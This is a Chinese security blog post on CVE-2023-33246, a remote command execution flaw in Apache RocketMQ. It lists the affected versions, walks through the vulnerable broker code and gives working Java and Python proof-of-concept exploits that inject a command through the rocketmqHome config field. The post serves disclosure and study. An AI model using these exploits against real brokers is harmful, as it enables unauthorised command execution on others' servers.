# Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246） - 合天网安实验室 - 博客园

> 原文：[`www.cnblogs.com/hetianlab/p/17598921.html`](https://www.cnblogs.com/hetianlab/p/17598921.html)

# 漏洞简介

RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。 此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。

影响版本

5.0.0 <= Apache RocketMQ < 5.1.1

4.0.0 <= Apache RocketMQ < 4.9.6

安全版本

Apache RocketMQ 5.1.1

Apache RocketMQ 4.9.6

## 漏洞复现

在本地创建 maven 项目 并添加依赖

```
<dependencies>   
 <!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->
        <dependency>
            <groupId>org.apache.rocketmq</groupId>
            <artifactId>rocketmq-tools</artifactId>
            <version>5.1.0</version>
        </dependency>
</dependencies>
```

编写漏洞利用代码

```
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
​
import java.util.Properties;
​
public class poc1 {
    public static void main(String[] args) throws Exception {
        // 创建 Properties 对象
        Properties props = new Properties();
        //修改 rocketmqHome 配置
        props.setProperty("rocketmqHome","-c gnome-calculator test");
        props.setProperty("filterServerNums","1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        //此处为 namesrv 端口,此端口无需可访问
        admin.setNamesrvAddr("192.168.222.130:9876");
        admin.start();
        // 更新配置⽂件
        //此处为 broker 端口，必须可访问
        admin.updateBrokerConfig("192.168.222.130:10911", props);
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
    }
}
```

## 漏洞分析

![image](img/312d8e8f9f42e69ab3f17809979d0ce8.png)​

![image](img/cd45d399203d3719151c7f9e57f58cc1.png)​

![image](img/7b6f6edd3036192f661952ca0ad92787.png)​

![image](img/9d969e3c7fce2758d4d76f445bc3b58a.png)​

我们看到真正有危险的操作应该是与 10911 进行通信的操作，没有进行身份验证和加密传输，同时带入了命令执行的参数

`org/apache/rocketmq/remoting/protocol/RequestCode.java`​ code 代表调用不同的功能

![image](img/82108a66147e941f8dd177811da4505f.png)`org/apache/rocketmq/broker/processor/AdminBrokerProcessor.java#processRequest`​

![image](img/7aafb940d11d12bb655ad67ca482c8bd.png)​​`org/apache/rocketmq/broker/processor/AdminBrokerProcessor.java#updateBrokerConfig`​

![image](img/96b409333f9f7df7186ba42727bed251.png)​​`org/apache/rocketmq/remoting/Configuration.java#update`​

![image](img/0688d5fdc98e0303d7b99ad761b7f856.png)​

如果属性名是其内置的，就进行更新操作

【----帮助网安学习，以下所有学习资料免费领！加 vx：yj009991，备注 “博客园” 获取！】

　① 网安学习成长路径思维导图
　② 60+网安经典常用工具包
　③ 100+SRC 漏洞分析报告
　④ 150+网安攻防实战技术电子书
　⑤ 最权威 CISSP 认证考试指南+题库
　⑥ 超 1800 页 CTF 实战技巧手册
　⑦ 最新网安大厂面试题合集（含答案）
　⑧ APP 客户端安全检测指南（安卓+IOS）

后面的一部分就比较清晰了

`org/apache/rocketmq/broker/BrokerStartup.java#start`​

![image](img/596a1a8c18e8a642b6fd73425a76108e.png)​​`org/apache/rocketmq/broker/BrokerController.java#start`​

![image](img/5c4fecf47dc28a53709bfa78d459f6b2.png)​​`org/apache/rocketmq/broker/BrokerController.java#startBasicService`​

![image](img/6aa2df442a6c059ac961fd4c13d7373f.png)​​`org/apache/rocketmq/broker/filtersrv/FilterServerManager.java#start`​

![image](img/ebcd1d8ce230f40dc835a328689da82d.png)

根据从 Wireshark 中抓取的数据包 我们也可以构造这样的 payload 触发漏洞

```
import socket
import binascii
client = socket.socket()
​
# you ip
client.connect(('192.168.222.130',10911))
​
# data
json='{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')
body='filterServerNums=1\nrocketmqHome=-c gnome-calculator test'.encode('utf-8')
json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2)               # 一个字节是 2 个十六进制数
head1 = '00000000'+str(hex(json_lens))[2:]                                   # hex(xxxx) 0x1243434 去掉 0x
all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)    # 总长度要 加上 head1[-8:] 的值
head2 = '00000000'+str(hex(all_lens))[2:]
data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8') # 协议总长度+json 长度+json+body
​
# send
client.send(bytes.fromhex(data))
data_recv = client.recv(1024)
print(data_recv)
```

‍

## 漏洞修复

移除了命令执行的模块​

![image](img/22ae5eb5a896611efec18da212f1c1e6.png)

    **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**